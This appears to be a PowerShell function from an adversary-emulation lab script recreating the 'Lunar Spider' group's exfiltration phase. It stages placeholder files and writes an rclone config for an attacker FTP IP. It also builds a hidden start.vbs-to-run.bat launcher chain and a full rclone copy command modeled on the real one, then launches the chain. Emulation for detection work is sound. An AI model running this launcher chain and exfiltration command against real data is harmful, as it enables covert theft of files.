# ============================================================================
# LUNAR SPIDER SIMULATION - PHASE 10: COLLECTION & EXFILTRATION
# ============================================================================
# Simulates: Day 20 exfiltration (~9h46m) using Rclone renamed to sihosts.exe,
# driven by start.vbs -> run.bat, with rclone.conf pointing at FTP host
# 45.135.232[.]3 (user J0eBidenAbrabdy1aS3ha2Yeami). The real run.bat copied
# an entire volume with a large --exclude filter and 45 parallel transfers.
# MITRE: T1074 Data Staged, T1560 Archive, T1048 Exfil Over Alt Protocol,
# T1567 Exfil to Cloud/Web
# ============================================================================

function Simulate-Exfiltration {
    param($SimPaths)

    Write-Host "[+] Phase 10: Collection & Exfiltration - Rclone (sihosts.exe) -> FTP ..." -ForegroundColor Green

    # --- Stage some "collected" victim files ----------------------------------
    1..6 | ForEach-Object {
        $f = Join-Path $SimPaths.VictimFiles ("finance_report_{0}.xlsx" -f $_)
        Set-Content -Path $f -Value ("Lab placeholder business document #{0}" -f $_) -Force
    }

    # --- Rclone renamed to sihosts.exe + rclone.conf --------------------------
    $rclone = "$env:ALLUSERSPROFILE\sihosts.exe"
    New-DecoyBinary -Path $rclone -SizeBytes 41943040 | Out-Null   # rclone is a large Go binary

    $rcloneConf = "$env:ALLUSERSPROFILE\rclone.conf"
    $confBody = @"
[ftp]
type = ftp
host = $($Global:LunarIOCs.ExfilFtpIP)
user = $($Global:LunarIOCs.ExfilFtpUser)
port = 21
pass = (obscured)
"@
    Set-Content -Path $rcloneConf -Value $confBody -Force
    Write-SimEvent -EventId 10001 -Message "SIMULATION: Rclone deployed as sihosts.exe with rclone.conf -> FTP $($Global:LunarIOCs.ExfilFtpIP)"

    # --- start.vbs -> run.bat launcher chain ----------------------------------
    $startVbs = "$env:ALLUSERSPROFILE\start.vbs"   # start.vbs (MD5 4b3e9c9e... ref)
    Set-Content -Path $startVbs -Value @'
Set o = CreateObject("WScript.Shell")
o.Run "cmd /c C:\ProgramData\run.bat", 0, False
'@ -Force

    $runBat = "$env:ALLUSERSPROFILE\run.bat"        # run.bat (MD5 c8ea3166... ref)
    # Exact rclone command shape from the report (excludes trimmed for readability;
    # target repointed at the sandbox victim_files folder so nothing real is read).
    $runBatBody = @"
C:\ProgramData\sihosts.exe copy "$($SimPaths.VictimFiles)" ftp:/E ^
 -q --exclude "*.{ai,bin,bmp,cab,dll,exe,ico,iso,js,json,lnk,log,msi,png,rar,sys,vmdk,zip}" ^
 --inplace --ignore-existing --auto-confirm ^
 --multi-thread-streams 45 --transfers 45 --min-size 1k --max-age 90M
"@
    Set-Content -Path $runBat -Value $runBatBody -Force

    # --- Execute the exfil chain (fails closed against the offline FTP host) ---
    Write-Host "    Launching start.vbs -> run.bat -> sihosts.exe (FTP offline, expected) ..." -ForegroundColor DarkGray
    Invoke-SafeNetworkAttempt -Target $Global:LunarIOCs.ExfilFtpIP -Port 21
    try {
        Start-Process -FilePath "wscript.exe" -ArgumentList "`"$startVbs`"" -WindowStyle Hidden -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 2
    } catch {}
    Write-SimEvent -EventId 10002 -Message "SIMULATION: Day-20 exfiltration launched (start.vbs -> run.bat -> sihosts.exe, ~9h46m in real case)"

    Write-Host "  [OK] Collection & Exfiltration artifacts created" -ForegroundColor Yellow
}
